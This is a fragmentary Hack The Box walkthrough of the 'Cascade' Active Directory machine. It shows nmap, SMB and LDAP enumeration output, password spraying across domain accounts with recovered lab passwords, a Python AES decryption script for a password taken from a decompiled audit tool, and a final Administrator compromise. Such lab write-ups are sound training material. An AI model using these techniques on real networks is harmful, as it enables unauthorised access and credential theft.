...
>
> ```bash
> PING 10.129.93.0 (10.129.93.0) 56(84) bytes of data.
> 64 bytes from 10.129.93.0: icmp_seq=1 ttl=127 time=37.8 ms
> 
> --- 10.129.93.0 ping statistics ---
> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
> rtt min/avg/max/mdev = 37.783/37.783/37.783/0.000 ms
> ```
>
...
> [!BUG]- *cascade.allPorts*
>
> ```bash
> # Nmap 7.94SVN scan initiated Sat Oct 11 18:58:33 2025 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG cascade.allPorts 10.129.93.0
> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
> Host: 10.129.93.0 ()	Status: Up
> Host: 10.129.93.0 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 49154/open/tcp/////, 49155/open/tcp/////, 49157/open/tcp/////, 49158/open/tcp/////, 49165/open/tcp/////	Ignored State: filtered (65520)
> # Nmap done at Sat Oct 11 18:58:59 2025 -- 1 IP address (1 host up) scanned in 26.50 seconds
> ```
>
...
> [!BUG]- *cascade.targeted*
>
> ```bash
> # Nmap 7.94SVN scan initiated Sat Oct 11 18:59:37 2025 as: nmap -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49165 -sCV -v -n -Pn --disable-arp-ping -oN cascade.targeted 10.129.93.0
> Nmap scan report for 10.129.93.0
...
> 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-11 16:59:45Z)
...
> Host script results:
> | smb2-time: 
> |   date: 2025-10-11T17:00:38
> |_  start_date: 2025-10-11T16:41:29
> | smb2-security-mode: 
> |   2:1:0: 
...
> # Nmap done at Sat Oct 11 19:01:16 2025 -- 1 IP address (1 host up) scanned in 98.79 seconds
> ```
>
...
> 
> # HTB Machines
> 10.129.93.0	casc-dc1	cascade.local	casc-dc1.cascade.local
> ```
>
...
> ```bash
> SMB                      10.129.93.0     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
> SMB                      10.129.93.0     445    CASC-DC1         [+] cascade.local\: 
> ```
>
...
> ```bash
> SMB                      10.129.93.0     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\guest: STATUS_LOGON_FAILURE 
> ```
>
...
> ```bash
> SMB                      10.129.93.0     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\anyRandomUser: STATUS_LOGON_FAILURE 
> ```
>
...
>
> ```bash
> ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> AXFR cascade.local @10.129.93.0
> ;; global options: +cmd
> ; Transfer failed.
> ```
>
...
With a user list, we can check if any of the above user accounts is susceptible to *[[ASREPROAST|ASREPRoast]]*
...
For such a task, we usually use ***Impacket's [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)***
...
> SMB                      10.129.93.0     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
> SMB                      10.129.93.0     445    CASC-DC1         [+] cascade.local\: 
> SMB                      10.129.93.0     445    CASC-DC1         [+] Dumping password info for domain: CASCADE
> SMB                      10.129.93.0     445    CASC-DC1         Minimum password length: 5
> SMB                      10.129.93.0     445    CASC-DC1         Password history length: None
> SMB                      10.129.93.0     445    CASC-DC1         Maximum password age: Not Set
> SMB                      10.129.93.0     445    CASC-DC1         
> SMB                      10.129.93.0     445    CASC-DC1         Password Complexity Flags: 000000
> SMB                      10.129.93.0     445    CASC-DC1            Domain Refuse Password Change: 0
> SMB                      10.129.93.0     445    CASC-DC1            Domain Password Store Cleartext: 0
> SMB                      10.129.93.0     445    CASC-DC1            Domain Password Lockout Admins: 0
> SMB                      10.129.93.0     445    CASC-DC1            Domain Password No Clear Change: 0
> SMB                      10.129.93.0     445    CASC-DC1            Domain Password No Anon Change: 0
> SMB                      10.129.93.0     445    CASC-DC1            Domain Password Complex: 0
> SMB                      10.129.93.0     445    CASC-DC1         
> SMB                      10.129.93.0     445    CASC-DC1         Minimum password age: None
> SMB                      10.129.93.0     445    CASC-DC1         Reset Account Lockout Counter: 30 minutes 
> SMB                      10.129.93.0     445    CASC-DC1         Locked Account Duration: 30 minutes 
> SMB                      10.129.93.0     445    CASC-DC1         Account Lockout Threshold: None
> SMB                      10.129.93.0     445    CASC-DC1         Forced Log off Time: Not Set
> ```
>
...
> ```bash
> SMB                      10.129.93.0     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\a.turnbull:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\b.hanson:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\BackupSvc:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\d.burman:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\e.crowe:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\i.croft:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\j.allen:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\j.goodhand:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\j.wakefield:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\s.hickson:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
> SMB                      10.129.93.0     445    CASC-DC1         [-] cascade.local\util:rY4n5eva STATUS_LOGON_FAILURE 
> ```
>
...
> ```bash
> TERMSRV/CASC-DC1
> TERMSRV/CASC-DC1.cascade.local
> ldap/CASC-DC1.cascade.local/ForestDnsZones.cascade.local
> ldap/CASC-DC1.cascade.local/DomainDnsZones.cascade.local
> Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/CASC-DC1.casca
> DNS/CASC-DC1.cascade.local
> GC/CASC-DC1.cascade.local/cascade.local
> RestrictedKrbHost/CASC-DC1.cascade.local
> RestrictedKrbHost/CASC-DC1
> HOST/CASC-DC1/CASCADE
> HOST/CASC-DC1.cascade.local/CASCADE
> HOST/CASC-DC1
> HOST/CASC-DC1.cascade.local
> HOST/CASC-DC1.cascade.local/cascade.local
> E3514235-4B06-11D1-AB04-00C04FC2DCD2/8bfc9a6c-6edc-45bd-
> ldap/CASC-DC1/CASCADE
> ldap/8bfc9a6c-6edc-45bd-9e27-251f9de2d5f7._msdcs.cascade
> ldap/CASC-DC1.cascade.local/CASCADE
> ldap/CASC-DC1
> ldap/CASC-DC1.cascade.local
> ldap/CASC-DC1.cascade.local/cascade.local
> kadmin/changepw
> ```
>
...
Likewise, we can use ***Impacket's [GetUserSPNs.py](https://github.com/fortra/impacket)***
...
Or using ***Impacket's [GetADUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetADUsers.py)***
...
> SMB                      10.129.93.0     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
> SMB                      10.129.93.0     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
> SMB                      10.129.93.0     445    CASC-DC1         [*] Enumerated shares
> SMB                      10.129.93.0     445    CASC-DC1         Share           Permissions     Remark
> SMB                      10.129.93.0     445    CASC-DC1         -----           -----------     ------
> SMB                      10.129.93.0     445    CASC-DC1         ADMIN$                          Remote Admin
> SMB                      10.129.93.0     445    CASC-DC1         Audit$                          
> SMB                      10.129.93.0     445    CASC-DC1         C$                              Default share
> SMB                      10.129.93.0     445    CASC-DC1         Data            READ            
> SMB                      10.129.93.0     445    CASC-DC1         IPC$                            Remote IPC
> SMB                      10.129.93.0     445    CASC-DC1         NETLOGON        READ            Logon server share 
> SMB                      10.129.93.0     445    CASC-DC1         print$          READ            Printer Drivers
> SMB                      10.129.93.0     445    CASC-DC1         SYSVOL          READ            Logon server share 
> ```
>
...
![[CASCADE-20251012151208733.webp|400]]
...
>
> ```bash
> SMB                      10.129.89.77    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\a.turnbull:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\b.hanson:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\BackupSvc:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\CascGuest:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\d.burman:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\e.crowe:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\i.croft:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\j.allen:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\j.goodhand:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\j.wakefield:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\r.thompson:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\s.hickson:sT333ve2 STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\util:sT333ve2 STATUS_LOGON_FAILURE 
> ```
>
...
Now, we could perform a more exhaustive domain enumeration by running a tool such as ***[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)***
...
![[CASCADE-20251014175529407.webp|300]]
...
![[CASCADE-20251014175633211.webp|300]]
...
> SMB                      10.129.89.77    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
> SMB                      10.129.89.77    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
> SMB                      10.129.89.77    445    CASC-DC1         [*] Enumerated shares
> SMB                      10.129.89.77    445    CASC-DC1         Share           Permissions     Remark
> SMB                      10.129.89.77    445    CASC-DC1         -----           -----------     ------
> SMB                      10.129.89.77    445    CASC-DC1         ADMIN$                          Remote Admin
> SMB                      10.129.89.77    445    CASC-DC1         Audit$          READ            
> SMB                      10.129.89.77    445    CASC-DC1         C$                              Default share
> SMB                      10.129.89.77    445    CASC-DC1         Data            READ            
> SMB                      10.129.89.77    445    CASC-DC1         IPC$                            Remote IPC
> SMB                      10.129.89.77    445    CASC-DC1         NETLOGON        READ            Logon server share 
> SMB                      10.129.89.77    445    CASC-DC1         print$          READ            Printer Drivers
> SMB                      10.129.89.77    445    CASC-DC1         SYSVOL          READ            Logon server share 
> ```
>
...
> 	.\Audit$\DB\*
> 	dr--r--r--                0 Tue Jan 28 22:43:18 2020	.
> 	dr--r--r--                0 Tue Jan 28 22:43:18 2020	..
> 	fr--r--r--            24576 Tue Jan 28 22:43:18 2020	Audit.db
> 	.\Audit$\x64\*
> 	dr--r--r--                0 Tue Jan 28 21:42:18 2020	.
> 	dr--r--r--                0 Tue Jan 28 21:42:18 2020	..
> 	fr--r--r--          1639936 Tue Jan 28 21:42:18 2020	SQLite.Interop.dll
> 	.\Audit$\x86\*
> 	dr--r--r--                0 Tue Jan 28 21:42:18 2020	.
> 	dr--r--r--                0 Tue Jan 28 21:42:18 2020	..
> 	fr--r--r--          1246720 Tue Jan 28 21:42:18 2020	SQLite.Interop.dll
> ```
>
...
>
> ```bash
> 5066549580850859     16 -rwxr-xr-x   1 root     root        13312 ene 28  2020 ./Audit/CascAudit.exe
> 1688849860322306     12 -rwxr-xr-x   1 root     root        12288 ene 29  2020 ./Audit/CascCrypto.dll
> 4785074604140702     24 -rwxr-xr-x   1 root     root        24576 ene 28  2020 ./Audit/DB/Audit.db
> 14355223812281570      1 -rwxr-xr-x   1 root     root           45 ene 29  2020 ./Audit/RunAudit.bat
>   844424930267608    356 -rwxr-xr-x   1 root     root       363520 oct 27  2019 ./Audit/System.Data.SQLite.dll
>   844424930267610    184 -rwxr-xr-x   1 root     root       186880 oct 27  2019 ./Audit/System.Data.SQLite.EF6.dll
>   844424930267599   1604 -rwxr-xr-x   1 root     root      1639936 oct 27  2019 ./Audit/x64/SQLite.Interop.dll
>   844424930267601   1220 -rwxr-xr-x   1 root     root      1246720 oct 27  2019 ./Audit/x86/SQLite.Interop.dll
> ```
>
...
Let's use a *.NET decompiling tool*, such as ***[DotPeek](https://www.jetbrains.com/es-es/decompiler/)*** or ***[DNSPy](https://dnspy.org/)***, to take a look at its source code

To do so, simply use a *Window Machine*, transfer both binaries and open them with *DotPeek*

- ***CascAudit.exe***

![[CASCADE-20251014183442875.webp|350]]
...
![[CASCADE-20251014184252022.webp|350]]
...
In this case, we will use a *code snippet* from the ***[PyCryptodome](https://www.pycryptodome.org/) Python library*** and the ***[CyberChef](https://cyberchef.io/)*** website

###### *Python*

Just create a *python* script with the following decryption function and all the corresponding data

> [!BUG]- *Decryption Script*
>
> ```python
> #!/usr/bin/env python3
> 
...
> 
>     pt = unpad(cipher.decrypt(b64decode(ct)), AES.block_size).decode()
> 
>     return pt
> 
> if __name__ == '__main__':
> 
>     print(decrypt(b'BQO5l5Kj9MdErXx6Q6AGOw==', b'c4scadek3y654321', b'1tdyjCbY1Ix49842'))
> ```
>
...
![[CASCADE-20251014190538616.webp|300]]
...
> ```bash
> SMB                      10.129.89.77    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\a.turnbull:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\b.hanson:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\BackupSvc:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\CascGuest:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\d.burman:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\e.crowe:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\i.croft:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\j.allen:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\j.goodhand:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\j.wakefield:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\r.thompson:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\s.hickson:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\s.smith:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> SMB                      10.129.89.77    445    CASC-DC1         [-] cascade.local\util:w3lc0meFr31nd STATUS_LOGON_FAILURE 
> ```
>
...
> ```bash
> SMB                      10.129.89.77    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
> SMB                      10.129.89.77    445    CASC-DC1         [+] cascade.local\Administrator:baCT3r1aN00dles (Pwn3d!)
> ```
>
